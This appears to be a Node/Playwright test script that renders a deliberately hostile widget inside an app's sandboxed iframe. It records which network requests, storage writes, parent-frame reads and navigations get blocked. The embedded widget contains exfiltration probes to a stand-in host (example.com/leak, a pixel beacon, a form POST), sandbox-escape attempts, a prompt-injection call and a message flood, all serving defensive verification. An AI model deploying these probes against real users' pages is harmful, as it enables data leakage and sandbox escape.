/**
 * Proves the widget sandbox outside the app, in headless Edge or Chrome (no window):
 *
 *   node scripts/widget-sandbox-check.mjs [--electron-csp] [--shot scratch/genui/sandbox-check.png]
 *
 * Serves public/widget-frame.html and a host page on a throwaway local port, renders a hostile
 * widget the way the app does (postMessage to the nested frame), and reports every network request
 * the browser attempted beyond the two local pages, what the widget could reach, and whether its
 * scripts ran. --electron-csp gives the host page the desktop app's policy (frame-src 'self') and
 * the frame page the widget policy as a header, as electron/main.ts should.
 */
import { createServer } from 'node:http';
import { readFileSync, existsSync, mkdirSync } from 'node:fs';
import path from 'node:path';
import { chromium } from 'playwright-core';

const args = process.argv.slice(2);
const electronCsp = args.includes('--electron-csp');
const shotAt = args.indexOf('--shot');
const shot = shotAt >= 0 ? args[shotAt + 1] : null;

const root = path.resolve(path.dirname(new URL(import.meta.url).pathname.replace(/^\/([A-Za-z]:)/, '$1')), '..');
const frameHtml = readFileSync(path.join(root, 'public/widget-frame.html'), 'utf8');
const WIDGET_CSP = frameHtml.match(/http-equiv="Content-Security-Policy"\s+content="([^"]+)"/)[1];
const APP_CSP = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; connect-src 'self'; frame-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'";

const HOSTILE = `<h2 id="t">Hostile widget</h2><pre id="log"></pre>
<script>
const log = (s) => (document.getElementById('log').textContent += s + '\\n');
log('scripts run; navigation api: ' + typeof navigation);
navigation.addEventListener('navigate', (e) => log('navigate event: cancelable=' + e.cancelable + ' canIntercept=' + e.canIntercept + ' defaultPrevented=' + e.defaultPrevented));
fetch('https://example.com/leak?d=1').then(() => log('fetch: got through'), () => log('fetch: blocked'));
const img = new Image(); img.onload = () => log('img: got through'); img.onerror = () => log('img: blocked'); img.src = 'https://example.com/pixel.gif';
try { new WebSocket('ws://127.0.0.1:9/x').onerror = () => log('ws: blocked'); } catch (e) { log('ws: blocked (' + e.name + ')'); }
try { parent.document.title; log('parent.document: READ'); } catch (e) { log('parent.document: blocked'); }
try { top.document.title; log('top.document: READ'); } catch (e) { log('top.document: blocked'); }
try { top.location.href = 'https://example.com/?top'; log('top.location: no throw'); } catch (e) { log('top.location: blocked (' + e.name + ')'); }
try { log('window.open: ' + (window.open('https://example.com/?popup') ? 'OPENED' : 'blocked')); } catch (e) { log('window.open: blocked'); }
try { localStorage.setItem('a', 'b'); log('localStorage: WRITABLE'); } catch (e) { log('localStorage: blocked'); }
try { document.cookie = 'a=b'; log('cookie: ' + (document.cookie ? 'SET' : 'blocked')); } catch (e) { log('cookie: blocked'); }
const f = document.createElement('form'); f.method = 'post'; f.action = 'https://example.com/collect'; document.body.append(f);
try { HTMLFormElement.prototype.requestSubmit.call(f); log('form: shimmed, nothing sent'); } catch (e) { log('form: blocked'); }
sendPrompt('do something bad');
for (let i = 0; i < 2000; i++) parent.parent.postMessage({ __sable: 1, type: 'ping' }, '*');
setTimeout(() => { log('navigating self'); location.href = 'https://example.com/?self-nav'; }, 600);
</script>`;

const HOST = `<!doctype html><html><head><meta charset="utf-8"><title>host</title>
<style>body{background:#0c0c0e;color:#f2f1ee;font:13px system-ui;margin:20px}iframe{width:720px;height:420px;border:1px solid #333}</style></head>
<body><iframe id="f" sandbox="allow-scripts" src="/widget-frame.html"></iframe><pre id="out"></pre>
<script>
const out = (s) => (document.getElementById('out').textContent += s + '\\n');
const outer = document.getElementById('f');
const counts = {};
window.addEventListener('message', (e) => {
  const inner = outer.contentWindow && outer.contentWindow.frames[0];
  if (e.source !== inner) { counts.foreign = (counts.foreign || 0) + 1; return; }
  const d = e.data || {};
  counts[d.type] = (counts[d.type] || 0) + 1;
  if (d.type === 'ready') inner.postMessage({ __sable: 1, type: 'init', css: 'body{color:#f2f1ee;font:13px system-ui}', fonts: '' }, '*'), inner.postMessage({ __sable: 1, type: 'render', code: ${JSON.stringify(HOSTILE).replace(/<\//g, '<\\/')}, final: true }, '*');
  if (d.type === 'blocked') out('csp blocked: ' + d.directive + ' ' + d.uri);
});
window.report = () => counts;
</script></body></html>`;

const server = createServer((req, res) => {
  const url = new URL(req.url, 'http://x');
  if (url.pathname === '/widget-frame.html') {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', ...(electronCsp ? { 'content-security-policy': WIDGET_CSP } : {}) });
    return res.end(frameHtml);
  }
  if (url.pathname === '/') {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', ...(electronCsp ? { 'content-security-policy': APP_CSP } : {}) });
    return res.end(HOST);
  }
  res.writeHead(404).end();
});
await new Promise((r) => server.listen(0, '127.0.0.1', r));
const base = `http://127.0.0.1:${server.address().port}`;

const exe = ['C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe', 'C:/Program Files/Microsoft/Edge/Application/msedge.exe', 'C:/Program Files/Google/Chrome/Application/chrome.exe'].find((p) => existsSync(p));
const browser = await chromium.launch({ headless: true, ...(exe ? { executablePath: exe } : { channel: 'chrome' }) });
const page = await browser.newPage({ viewport: { width: 900, height: 760 } });
const requests = [];
const consoleLines = [];
const failed = new Map();
page.on('request', (r) => requests.push(r.url().slice(0, 120)));
page.on('requestfailed', (r) => failed.set(r.url().slice(0, 120), r.failure()?.errorText ?? 'failed'));
const answered = new Set();
page.on('response', (r) => answered.add(r.url().slice(0, 120)));
page.on('console', (m) => consoleLines.push(m.text().slice(0, 200)));
page.on('popup', (p) => requests.push('POPUP ' + p.url()));
try {
  await page.goto(base + '/', { waitUntil: 'load' });
  // Read what the widget saw before it tries to leave (at 600 ms), then look again after.
  let inner;
  for (let i = 0; i < 40 && !inner; i++) {
    await page.waitForTimeout(25);
    inner = page.frames().find((f) => f.url() === 'about:srcdoc');
  }
  await page.waitForTimeout(350);
  const readLog = (f) => (f ? f.evaluate(() => document.getElementById('log')?.textContent ?? '(no log)').catch((e) => `(frame gone: ${e.message.split('\n')[0]})`) : Promise.resolve('(no nested frame)'));
  let before = await readLog(inner);
  await page.waitForTimeout(300);
  before += '\n' + (await readLog(inner)).split('\n').slice(-3).join(' | ');
  await page.waitForTimeout(2200);
  const innerLog = before + '\nafter the navigation attempt: ' + (page.frames().some((f) => f.url() === 'about:srcdoc') ? 'still on its page' : 'frame replaced: ' + page.frames().map((f) => f.url()).join(' '));
  const counts = await page.evaluate(() => window.report());
  const frames = page.frames().map((f) => f.url());
  // Requests the page attempted beyond its own two pages, and what became of each.
  const external = requests
    .filter((u) => !u.startsWith(base) && !u.startsWith('about:') && !u.startsWith('data:'))
    .map((u) => `${u} → ${answered.has(u) ? 'ANSWERED BY THE NETWORK' : failed.has(u) ? `failed before the network (${failed.get(u)})` : 'no response'}`);
  console.log(JSON.stringify({ electronCsp, frames, innerLog: innerLog.trim().split('\n'), messagesSeenByHost: counts, externalRequests: external, console: consoleLines.filter((l) => /Refused|Blocked|Unsafe|sandbox|violates/i.test(l)).slice(0, 14) }, null, 2));
  if (shot) {
    mkdirSync(path.dirname(path.resolve(shot)), { recursive: true });
    await page.screenshot({ path: shot });
  }
} finally {
  await browser.close();
  server.close();
}
